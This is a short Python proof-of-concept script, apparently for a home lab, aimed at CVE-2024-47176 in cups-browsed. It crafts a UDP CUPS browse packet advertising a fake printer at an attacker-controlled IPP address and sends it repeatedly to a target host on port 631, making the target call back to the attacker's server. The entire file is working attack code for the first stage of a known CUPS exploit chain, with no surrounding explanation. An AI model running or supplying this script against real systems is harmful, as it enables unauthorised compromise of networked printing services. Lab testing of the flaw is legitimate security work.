import socket
import time

# Configuration
PI_IP = "10.148.25.55"        # Your Pi's local IP
CLIENT_IP = "YOUR_CLIENT_IP"  # Replace with your client machine's local IP
CLIENT_PORT = 631              # Port your fake IPP server will listen on
PRINTER_NAME = "FAKE_PRINTER"

def send_browse_packet():
    # Craft the CUPS browse packet
    # Format: type SP state SP uri SP location SP info SP make-model
    packet = (
        f"0x3 0x0 ipp://{CLIENT_IP}:{CLIENT_PORT}/printers/{PRINTER_NAME} "
        f'"Lab Printer" "CVE-2024-47176 Test" "Test Printer"'
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    print(f"[*] Sending fake CUPS browse packet to {PI_IP}:631")
    print(f"[*] Advertising fake printer at ipp://{CLIENT_IP}:{CLIENT_PORT}/printers/{PRINTER_NAME}")

    # Send repeatedly so cups-browsed picks it up
    for i in range(5):
        sock.sendto(packet.encode(), (PI_IP, 631))
        print(f"[*] Packet {i+1}/5 sent")
        time.sleep(1)

    sock.close()
    print("[+] Browse packets sent. Check your IPP server for incoming connections.")

if __name__ == "__main__":
    send_browse_packet()
